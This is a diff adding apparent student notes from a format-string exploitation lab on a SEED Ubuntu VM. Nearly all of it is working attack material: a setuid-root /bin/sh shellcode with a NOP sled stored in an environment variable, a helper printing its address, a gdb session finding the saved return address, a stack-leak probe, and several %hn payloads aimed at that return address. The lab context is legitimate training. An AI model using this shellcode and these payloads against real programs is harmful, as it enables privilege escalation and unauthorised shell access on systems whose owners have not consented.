@@ -1,0 +1,51 @@
+//export EGG=$(python -c "print '\x90'*1000 + '\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80'")
+#include <stdio.h>
+#include <stdlib.h>
+int main(void)
+{
+printf("Egg address: %p ",getenv("EGG"));
+}
+
+
+$'A$(printf "\x2e\xef\xff\xbf\x2c\xef\xff\xbf")%.49146x%12\$n%.12955x%13\$n'
+
+[10/22/2025 06:12] seed@ubuntu:~/exp/lab4$ gdb ta2
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/seed/exp/lab4/ta2...(no debugging symbols found)...done.
+
+
+
+
+
+环境变量EGG中存在shellcode，EGG地址0xbffff29a
+(gdb) b printf
+Breakpoint 1 at 0x8048320
+(gdb) r 123
+Starting program: /home/seed/exp/lab4/ta2 123
+
+Breakpoint 1, 0xb7e688a0 in printf () from /lib/i386-linux-gnu/libc.so.6
+(gdb) info frame
+Stack level 0, frame at 0xbfffeb20:
+ eip = 0xb7e688a0 in printf; saved eip 0x8048463
+ called by frame at 0xbfffef60
+ Arglist at 0xbfffeb18, args: 
+ Locals at 0xbfffeb18, Previous frame's sp is 0xbfffeb20
+ Saved registers:
+  eip at 0xbfffeb1c
+(gdb) 
+
+[10/22/2025 06:11] seed@ubuntu:~/exp/lab4$ ta2 $'AAAA_%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.\n'
+AAAA_bffff15e.3fc.b7fe771d.b7e2ec13.b7fde5dc.1e58.bfffefe4.bfffed8c.0.1.41000002.5f414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
+^C
+[10/22/2025 06:12] seed@ubuntu:~/exp/lab4$ ta2 $'A$(printf "\x1e\xeb\xff\xbf\x1c\xeb\xff\xbf")%.49146x%12\$hn%.12955x%13\$hn'
+
+ta2 "A$(printf "\x1e\xeb\xff\xbf\x1c\xeb\xff\xbf")%.49142x%12\$hn%.12955x%13\$hn$"
+"A$(printf "\xfe\xea\xff\xbf\xfc\xea\xff\xbf")%.49142x%12\$hn%.12955x%13\$hn"
